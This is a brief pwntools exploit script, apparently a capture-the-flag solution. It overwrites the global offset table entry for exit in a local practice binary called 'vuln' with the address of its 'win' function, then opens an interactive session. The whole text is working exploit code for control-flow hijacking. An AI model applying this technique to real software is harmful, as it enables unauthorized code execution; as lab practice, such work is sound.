from pwn import *
import os

p = process('./vuln')
e = ELF('./vuln')

exit_got = e.got['exit']
win_addr = e.symbols['win']

p.sendline(str(exit_got))
p.sendline(str(win_addr))

p.interactive()
